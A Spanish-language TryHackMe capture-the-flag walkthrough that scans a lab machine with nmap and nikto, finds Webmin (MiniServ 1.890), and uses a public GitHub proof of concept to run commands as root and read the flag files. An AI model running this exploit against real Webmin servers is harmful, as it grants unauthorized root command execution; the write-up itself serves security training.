Bienvenidos a otra sala de tryhackme, en esta ocasion traemos una maquina bastante sencilla en el que tenemos que descubrir la version del servidor y encontrar el exploit para reclamar ambas flags.

# Recon

Iniciamos nuestro reconocimiento utilizando __nmap__. Le diremos que escanee todos los puertos abiertos, con una tasa de paquetes de 5000, en modo sigiloso sin activar las alertas de seguridad y haciendo el escaneo mas rapido, tambien le diremos que no compruebe si el objetivo este en linea, que no resuelva los nombres del host durante el escaneo evitando que los servidores __DNS__ registren el escaneo y haciendo el escaneo mucho mas rapido, tambien que nos muestre la version del servicio, y lo resuelva todo en modo agresivo "__T4__", usamos verbose para ver el progreso del escaneo y que guarde todo el proceso en formato normal, para luego poder echarle un vistazo siempre que querramos. Ejecutaremos nuestro comando : `sudo nmap  -p- --open --min-rate 5000 -sS -Pn -n -sV -T4 -vvv IPTARGET -oN nmap`

```ruby
Nmap scan report for IPTARGET
Host is up, received user-set (0.25s latency).
Scanned at 2023-07-05 02:18:53 EDT for 53s
Not shown: 65533 closed ports
Reason: 65533 resets
PORT      STATE SERVICE REASON         VERSION
22/tcp    open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
10000/tcp open  http    syn-ack ttl 63 MiniServ 1.890 (Webmin httpd)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap

```

Nuestro escaneo de nmap nos muestra los puertos ssh y http abiertos. Tenemos el servidor web configurado en el puerto 10.000. Intente lanzar gobuster para descubrir directorios ocultos pero no tuve exito. 

Utilizamos nikto para descubir informacion acerca del servidor web como  posibles versiones o vulnerabilidades.

```ruby
nikto -h http://IPTARGET:10000

+ Server: MiniServ/1.890
+ The anti-clickjacking X-Frame-Options header is not present.
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ DEBUG HTTP verb may show server debugging information. See http://msdn.microsoft.com/en-us/library/e8z01xdh%28VS.80%29.aspx for details.
+ MiniServ - This is the Webmin Unix administrator. It should not be running unless required.

```

Nos indica que tiene como servidor : MiniServ que pertenece al sitio webmin unix administrator. Realizamos una busqueda en general por internet buscando posibles exploits para webmin con la version de Miniserv 1.890. Encontramos este repo de github : https://github.com/n0obit4/Webmin_1.890-POC.

Se trata de un exploit en el que podemos lanzar comandos dentro del sistema ya con usuario privilegiado root. Nos tranferimos el exploit a nuestra maquina atacante, y le tenemos que especificar el host, puerto y comando que querramos utilizar.

```bash
python3 exploit.py -host IPTARGET -port 10000 -cmd "whoami"
```

Como ya tendremos el usuario root incorportado, tenemos que leer solamente ambas flag.

```bash
python3 exploit.py -host IPTARGET -port 10000 -cmd "ls /home"
python3 exploit.py -host IPTARGET -port 10000 -cmd "cat /root/root.txt"
```